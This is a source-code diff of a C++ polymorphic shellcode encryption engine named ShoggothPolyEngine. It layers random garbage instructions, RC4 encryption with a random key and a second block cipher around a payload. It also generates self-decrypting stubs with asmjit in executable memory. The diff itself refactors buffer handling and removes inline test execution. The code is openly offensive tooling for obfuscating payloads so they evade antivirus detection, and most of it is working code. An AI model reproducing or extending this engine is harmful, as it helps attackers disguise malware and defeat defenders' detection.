@@ -7,7 +7,7 @@
 //                 decryptor code
 //
 ///////////////////////////////////////////////////////////
-typedef int (*Func)(void);
+
 //typedef void (*Encrypt)(RC4STATE *, uint8_t*,size_t);
 #define BLOCK_SIZE 8
 
@@ -37,7 +37,6 @@ void ShoggothPolyEngine::DebugBuffer(PBYTE buffer, int bufferSize) {
 
 PBYTE ShoggothPolyEngine::AssembleCodeHolder(int& codeSize) {
     Func functionPtr;
-    PBYTE returnValue;
     endOffset = asmjitAssembler->offset();
     codeSize = endOffset - startOffset;
     Error err = asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
@@ -99,62 +98,60 @@ x86::Gp ShoggothPolyEngine::GetRandomGeneralPurposeRegister() {
 }
 
 
-void ShoggothPolyEngine::StartEncoding(PBYTE payload, uint64_t payloadSize) {
+PBYTE ShoggothPolyEngine::StartEncoding(PBYTE payload, uint64_t payloadSize, int &encryptedSize) {
     int firstGarbageSize = 0;
     int firstGarbageWithPayloadSize = 0;
-    int firstDecryptorSize = 0;
     int firstDecryptorAndEncryptedPayloadSize = 0;
     int firstEncryptedPayloadSize = 0;
+    int secondEncryptedSize = 0;
+    int secondDecryptorAndEncryptedPayloadSize = 0;
+    int firstKeySize = RandomizeInRange(1, 256);
     PBYTE firstGarbage = NULL;
     PBYTE firstGarbageWithPayload = NULL;
     PBYTE firstEncryptedPayload = NULL;
-    PBYTE firstDecryptor = NULL;
     PBYTE firstDecryptorAndEncryptedPayload = NULL;
-    //PBYTE key = GetRandomBytes(RandomizeInRange(1, 256));
-    uint8_t key[3] = { 'a', 'b', 'c' };
+    PBYTE firstEncryptionKey = GetRandomBytes(firstKeySize);
+    PBYTE secondEncryptedPayload = NULL;
+    PBYTE secondDecryptorAndEncryptedPayload = NULL;
     // Push all registers first
-    this->PushAllRegisters();
+    // this->PushAllRegisters();
     
     // Get Some Garbage Instructions
     firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
+    
+    
+
     firstGarbageWithPayloadSize = payloadSize + firstGarbageSize;
-    firstGarbageWithPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, firstGarbageWithPayloadSize);
-    memcpy(firstGarbageWithPayload, firstGarbage, firstGarbageSize);
-    memcpy(firstGarbageWithPayload + firstGarbageSize, payload, payloadSize);
+
+    firstGarbageWithPayload = MergeChunks(firstGarbage, firstGarbageSize, payload, payloadSize);
+    VirtualFree(payload, payloadSize, MEM_RELEASE);
+    VirtualFree(firstGarbage, firstGarbageSize, MEM_RELEASE);
+
+    
    
-    firstEncryptedPayload = this->FirstEncryption(firstGarbageWithPayload, firstGarbageWithPayloadSize, key, 3);
+    firstEncryptedPayload = this->FirstEncryption(firstGarbageWithPayload, firstGarbageWithPayloadSize, firstEncryptionKey, firstKeySize);
     firstEncryptedPayloadSize = firstGarbageWithPayloadSize;
 
-    firstDecryptor = this->FirstDecryptor(firstEncryptedPayload, firstGarbageWithPayloadSize, key, 3, firstDecryptorSize);
-    this->DebugBuffer(firstDecryptor, firstDecryptorSize);
-    firstDecryptorAndEncryptedPayloadSize = firstDecryptorSize + firstGarbageWithPayloadSize;
-    firstDecryptorAndEncryptedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, firstDecryptorAndEncryptedPayloadSize);
-    memcpy(firstDecryptorAndEncryptedPayload, firstDecryptor, firstDecryptorSize);
-    memcpy(firstDecryptorAndEncryptedPayload + firstDecryptorSize, firstEncryptedPayload, firstEncryptedPayloadSize);
-    // TEST
-    //Func fun = (Func)VirtualAlloc(NULL, firstDecryptorSize  + firstGarbageWithPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    //memcpy(fun, firstDecryptor, firstDecryptorSize);
-    //memcpy((PBYTE) fun + firstDecryptorSize, firstEncryptedStup, firstGarbageWithPayloadSize);
-    //fun();
-    this->PopAllRegisters();
-    HeapFree(GetProcessHeap(), NULL, firstGarbage);
-    HeapFree(GetProcessHeap(), NULL, firstGarbageWithPayload);
-    HeapFree(GetProcessHeap(), NULL, firstEncryptedPayload);
-    HeapFree(GetProcessHeap(), NULL, firstDecryptor);
-    HeapFree(GetProcessHeap(), NULL, firstDecryptorAndEncryptedPayload);
+    firstDecryptorAndEncryptedPayload = this->FirstDecryptor(firstEncryptedPayload, firstEncryptedPayloadSize, firstEncryptionKey, firstKeySize, firstDecryptorAndEncryptedPayloadSize);
+    
+    secondEncryptedPayload = this->SecondEncryption(firstDecryptorAndEncryptedPayload, firstDecryptorAndEncryptedPayloadSize, secondEncryptedSize);
+    
+    secondDecryptorAndEncryptedPayload = this->SecondDecryptor(secondEncryptedPayload, secondEncryptedSize, secondDecryptorAndEncryptedPayloadSize);
+    
+    // this->PopAllRegisters();
+    encryptedSize = secondDecryptorAndEncryptedPayloadSize;
+    return secondDecryptorAndEncryptedPayload;
 }
 
 
 PBYTE ShoggothPolyEngine::FirstEncryption(PBYTE plainPayload, int payloadSize, PBYTE key, int keySize) {
     // Dummy Encryption
-    PBYTE copyPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
     //PBYTE key = GetRandomBytes(RandomizeInRange(1, 256));
     //uint8_t key[3] = { 'a', 'b', 'c' };
     RC4STATE state = { 0 };
-    memcpy(copyPayload, plainPayload, payloadSize);
     this->InitRC4State(&state, key, keySize);
-    this->EncryptRC4(&state, copyPayload, payloadSize);
-    return copyPayload;
+    this->EncryptRC4(&state, plainPayload, payloadSize);
+    return plainPayload;
 }
 
 
@@ -207,20 +204,15 @@ void ShoggothPolyEngine::EncryptRC4(RC4STATE* state, uint8_t* msg, size_t len) {
     Ayrica payloadin nerde oldugunu gormek için de takip etmek icin de index diye bi degisken kullaniyo
 */
 
-PBYTE ShoggothPolyEngine::FirstDecryptor(PBYTE payload, int payloadSize, PBYTE key, int keySize, int& firstDecryptorSize) {
+PBYTE ShoggothPolyEngine::FirstDecryptor(PBYTE cipheredPayload, int payloadSize, PBYTE key, int keySize, int& firstDecryptorSize) {
     // Dummy Decryptor
     RC4STATE state = { 0 };
-    int RC4DecryptorSize = 0;
     PBYTE RC4DecryptorStub = 0;
     this->InitRC4State(&state, key, keySize);
     
-    
-    RC4DecryptorStub = this->GenerateRC4Decryptor(payload,payloadSize,&state,RC4DecryptorSize);
-    
+    RC4DecryptorStub = this->GenerateRC4Decryptor(cipheredPayload, payloadSize, &state, firstDecryptorSize);
 
-    PBYTE returnValue = this->AssembleCodeHolder(firstDecryptorSize);
-
-    return returnValue;
+    return RC4DecryptorStub;
 }
 
 
@@ -245,6 +237,7 @@ PBYTE ShoggothPolyEngine::FirstDecryptor(PBYTE payload, int payloadSize, PBYTE k
 PBYTE ShoggothPolyEngine::GenerateRC4Decryptor(PBYTE payload, int payloadSize, RC4STATE *statePtr, int &firstEncryptionStubSize) {
     PBYTE returnPtr = NULL;
     PBYTE codePtr = NULL;
+    PBYTE cursor = NULL;
     int RC4DecryptorSize = 0;
     DWORD adjustSize = 0;
     uint64_t patchAddress = NULL;
@@ -385,19 +378,20 @@ PBYTE ShoggothPolyEngine::GenerateRC4Decryptor(PBYTE payload, int payloadSize, R
     asmjitAssembler->setOffset(patchAddress);
     asmjitAssembler->dd(adjustSize);
     asmjitAssembler->setOffset(currentOffset);
-
-    
+    cursor = (PBYTE) statePtr;
+    for (int i = 0; i < sizeof(RC4STATE); i++) {
+        asmjitAssembler->db(cursor[i], 1);
+    }  
 
     codePtr = this->AssembleCodeHolder(RC4DecryptorSize);
     this->DebugBuffer(codePtr, RC4DecryptorSize);
-    returnPtr = (PBYTE) VirtualAlloc(NULL, payloadSize + RC4DecryptorSize + sizeof(RC4STATE), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    //returnPtr = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize + RC4DecryptorSize + sizeof(RC4STATE));
-    memcpy(returnPtr, codePtr, RC4DecryptorSize);
-    memcpy(returnPtr + RC4DecryptorSize, statePtr, sizeof(RC4STATE));
-    memcpy(returnPtr + RC4DecryptorSize + sizeof(RC4STATE), payload, payloadSize);
-    Func test = (Func)returnPtr;
-    test();
-    firstEncryptionStubSize = payloadSize + sizeof(RC4STATE) + RC4DecryptorSize;
+    returnPtr = MergeChunks(codePtr, RC4DecryptorSize, payload, payloadSize);
+    VirtualFree(codePtr, RC4DecryptorSize, MEM_RELEASE);
+    VirtualFree(payload, payloadSize, MEM_RELEASE);
+
+    //Func test = (Func)returnPtr;
+    //test();
+    firstEncryptionStubSize = payloadSize+ RC4DecryptorSize;
 ;   HeapFree(GetProcessHeap(), NULL, randomStringForLoop);
     HeapFree(GetProcessHeap(), NULL, randomStringForEnd);
     HeapFree(GetProcessHeap(), NULL, randomStringForCall);
@@ -413,7 +407,8 @@ PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, 
         this->numberOfBlocks++;
     }
     newPayloadSize = this->numberOfBlocks * BLOCK_SIZE;
-    encryptedArea = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newPayloadSize);
+    //encryptedArea = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newPayloadSize);
+    encryptedArea = (PBYTE)VirtualAlloc(NULL, newPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(encryptedArea, plainPayload, payloadSize);
     memset(encryptedArea + payloadSize, 0x90, (payloadSize % BLOCK_SIZE ? BLOCK_SIZE - payloadSize % BLOCK_SIZE : 0));
     blockCursor = (uint64_t*)encryptedArea;
@@ -424,6 +419,7 @@ PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, 
         this->ApplyRandomSecondEncryption(blockCursor, &(this->encryptListForBlocks[i]));
         blockCursor++;
     }
+    VirtualFree(plainPayload, payloadSize, MEM_RELEASE);
     return encryptedArea;
 }
 
@@ -436,6 +432,7 @@ PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload,int payloadSize
     int popStubSize = 0;
     int secondGarbageSize = 0;
     int decryptorStubSize = 0;
+    PBYTE returnPtr = NULL;
     PBYTE callStub = this->GetCallInstructionOverPayload(payloadSize, callStubSize);
     //PBYTE firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
     // Mov + rsp stub da eklenecek
@@ -443,17 +440,19 @@ PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload,int payloadSize
     //PBYTE secondGarbage = this->GenerateRandomGarbage(secondGarbageSize);
     PBYTE decryptorStub = this->GenerateSecondDecryptorStub(decryptorStubSize,secondGarbageSize);
 
-    Func funcTest = (Func)VirtualAlloc(NULL, callStubSize+payloadSize+popStubSize+decryptorStubSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy((PBYTE)funcTest + secondDecryptorBlockSize, callStub, callStubSize);
+    returnPtr = (PBYTE) VirtualAlloc(NULL, callStubSize+payloadSize+popStubSize+decryptorStubSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(returnPtr + secondDecryptorBlockSize, callStub, callStubSize);
     secondDecryptorBlockSize += callStubSize;
-    memcpy((PBYTE)funcTest + secondDecryptorBlockSize, encryptedPayload, payloadSize);
+    memcpy(returnPtr + secondDecryptorBlockSize, encryptedPayload, payloadSize);
     secondDecryptorBlockSize += payloadSize;
-    memcpy((PBYTE)funcTest + secondDecryptorBlockSize, popStub, popStubSize);
+    memcpy(returnPtr + secondDecryptorBlockSize, popStub, popStubSize);
     secondDecryptorBlockSize += popStubSize;
-    memcpy((PBYTE)funcTest + secondDecryptorBlockSize, decryptorStub, decryptorStubSize);
+    memcpy(returnPtr + secondDecryptorBlockSize, decryptorStub, decryptorStubSize);
     secondDecryptorBlockSize += decryptorStubSize;
-    funcTest();
-    return (PBYTE) funcTest;
+    VirtualFree(callStub, callStubSize, MEM_RELEASE);
+    VirtualFree(popStub, popStubSize, MEM_RELEASE);
+    VirtualFree(decryptorStub, decryptorStubSize, MEM_RELEASE);
+    return returnPtr;
 }
 
 
@@ -658,8 +657,6 @@ void ShoggothPolyEngine::ApplyRandomSecondEncryption(uint64_t* blockCursor, ENCR
 PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
     PBYTE garbageInstructions;
     PBYTE jmpOverRandomByte;
-    Func garbageInstTest;
-    Func jmpOverRandomByteTest;
     int codeSizeGarbage = 0;
     int codeSizeJmpOver = 0;
     PBYTE returnValue = NULL;
@@ -675,16 +672,15 @@ PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
     // jmpOverRandomByteTest = (Func)jmpOverRandomByte;
     // VirtualProtect(jmpOverRandomByteTest, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
     // jmpOverRandomByteTest();
-    returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSizeGarbage + codeSizeJmpOver);
     if (RandomizeBool()) {
-        memcpy(returnValue, garbageInstructions, codeSizeGarbage);
-        memcpy(returnValue + codeSizeGarbage, jmpOverRandomByte, codeSizeJmpOver);
+        returnValue = MergeChunks(jmpOverRandomByte, codeSizeJmpOver, garbageInstructions, codeSizeGarbage);
     }
     else {
-        memcpy(returnValue, jmpOverRandomByte, codeSizeJmpOver);
-        memcpy(returnValue + codeSizeJmpOver, garbageInstructions, codeSizeGarbage);
+        returnValue = MergeChunks(garbageInstructions, codeSizeGarbage, jmpOverRandomByte, codeSizeJmpOver);
     }
     garbageSize = codeSizeJmpOver + codeSizeGarbage;
+    VirtualFree(jmpOverRandomByte, codeSizeJmpOver, MEM_RELEASE);
+    VirtualFree(garbageInstructions, codeSizeGarbage, MEM_RELEASE);
     return returnValue;
 }
 
